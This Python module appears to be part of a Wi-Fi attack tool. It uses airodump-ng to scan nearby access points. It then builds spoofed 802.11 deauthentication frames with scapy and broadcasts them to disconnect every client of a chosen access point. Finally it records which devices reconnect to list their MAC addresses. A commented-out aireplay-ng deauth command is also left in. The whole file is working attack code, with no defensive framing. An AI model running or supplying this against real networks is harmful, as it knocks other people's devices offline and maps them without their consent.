from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from interface_func import monitor_mode, managed_mode
import subprocess
import time


# Returns a list containing every MAC address of every access point (AP) detected and its channel
def scan_access_points(interface):

    monitor_mode(interface)
    print("Scanning for access points....")
    try:
        AP_MAC_addr = []
        airodump_process = subprocess.Popen(["sudo", "airodump-ng", "--output-format", "csv", "-w", "output", interface+"mon"],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           universal_newlines=True)

        # Wait for some time to capture access point data
        time.sleep(20)

        # Terminate airodump-ng process
        airodump_process.terminate()

        # Parse the csv file
        with open("output-01.csv", "r") as csvfile:
            lines = csvfile.readlines()
            for line in lines[2:]:  # Skip the header
                parts = line.strip().split(',')

                # Stop at the end of the AP addresses in the CSV file
                if len(parts) < 15:
                    break
                bssid = parts[0].strip()
                channel = parts[3].strip()
                AP_MAC_addr.append((bssid,channel))
                
    except subprocess.CalledProcessError as e:
        print("Error scanning:", e)
        exit(1)


    # Delete the airmon-ng csv file
    try:
        subprocess.run(["sudo", "rm", "output-01.csv"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error deleting csv file")
        exit(1)

    managed_mode(interface)
    return AP_MAC_addr


# Function that sends deauth packets to all the devices of the AP_MAC_address 
def deauth_attack(AP_MAC_address, channel, interface):

    # Change the channel of the wifi interface in monitor mode (needed for deauth attacks)
    try:
        subprocess.run(["sudo", "iw", "dev", interface + "mon", "set", "channel", channel])
    except subprocess.CalledProcessError as e:
        print("Error changing channels")

    """
    try:
        print("Sending deauthentication frames to the AP: " + str(AP_MAC_address))
        deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", AP_MAC_address ,  interface + "mon" ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        deauth_process.terminate()
    except subprocess.CalledProcessError as e:
        print("Error sending deauthentication frames:", e)
        exit(1)

    """

    frame = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=AP_MAC_address, addr3=AP_MAC_address) / Dot11Deauth(reason=7)

    sendp(frame,inter=0.1, count=50, iface=interface + "mon", verbose=1)




# Function that monitors the traffic of a specific access point
def monitor(AP_MAC_address, interface):

    device_addr = []
    try:
        print("Monitoring")
        airodump_process = subprocess.Popen(["sudo", "airodump-ng","--bssid",AP_MAC_address,"--output-format", "csv", "-w", "output", interface+"mon"],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           universal_newlines=True)

        # Wait for some time to capture access point data
        time.sleep(30)
        

        # Terminate airodump-ng process
        airodump_process.terminate()

        with open("output-01.csv", "r") as csvfile:
            lines = csvfile.readlines()
            for line in lines[5:]:  # Skip the header
                parts = line.strip().split(',')
                if(len(parts) > 1):
                    device_addr.append(parts[0])


    except subprocess.CalledProcessError as e:
        print("Error scanning:", e)
        exit(1)

    try:
        subprocess.run(["sudo", "rm", "output-01.csv"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error deleting csv file")
        exit(1)

    return device_addr
    



# Returns a list containing all the devices connected to a specific access point address
def scan_devices(AP_MAC_address, channel, interface):

    monitor_mode(interface)

    print("Scanning devices for the access point: " + AP_MAC_address)
    # First deauthenticate all the devices of the access point mac address
    deauth_attack(AP_MAC_address,channel, interface)
    # Then monitor to see who reconnects
    devices = monitor(AP_MAC_address, interface)

    managed_mode(interface)
    return devices


#devices = scan_devices("F4:06:8D:B7:75:F9", "6", interface)
#print(devices)